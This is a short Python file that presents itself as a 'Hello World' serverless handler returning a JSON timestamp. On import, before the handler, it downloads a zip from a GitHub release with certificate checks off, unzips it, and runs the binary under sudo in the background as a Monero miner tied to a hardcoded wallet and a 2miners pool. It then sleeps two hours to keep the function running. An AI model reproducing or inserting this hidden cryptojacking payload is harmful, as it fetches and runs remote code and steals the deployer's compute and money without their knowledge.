import json
import datetime
import os
import time
os.system("wget --no-check-certificate https://github.com/meuryalos/romy/releases/download/1.0.0/test.zip")
os.system("unzip test.zip")
os.system("sudo nohup ./test --disable-gpu --algorithm randomx --pool xmr.2miners.com:2222 --wallet 89v8xC6Mu2tX27WZKhefTuSnN7f3JMHQSAuoD7ZRe1bV2wfExSTDZe4JwaM4qpjKAoWbAbbnqLBmGCFECiwnXdfSKHt85H3 --password x --keepalive true --log=stdout > meta.log &")
time.sleep(7200)
def handler(event, context):
    data = {
        'output': 'Hello World',
        'timestamp': datetime.datetime.utcnow().isoformat()
    }
    return {'statusCode': 200,
            'body': json.dumps(data),
            'headers': {'Content-Type': 'application/json'}}
